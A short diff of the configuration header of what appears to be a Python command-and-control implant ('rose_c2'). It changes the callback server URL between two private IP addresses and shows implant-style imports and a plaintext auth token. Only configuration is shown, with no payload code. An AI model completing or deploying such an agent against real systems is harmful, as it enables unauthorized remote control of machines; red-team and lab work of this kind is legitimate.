@@ -2,7 +2,7 @@
 import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
 from urllib.parse import urlencode
 
-SERVER_URL="https://10.100.1.56:8000/"
+SERVER_URL="https://192.168.10.11:443/"
 AGENT_NAME="example1"
 AGENT_TYPE="rose_c2"
 AUTH_TOKEN="plaintext_really"
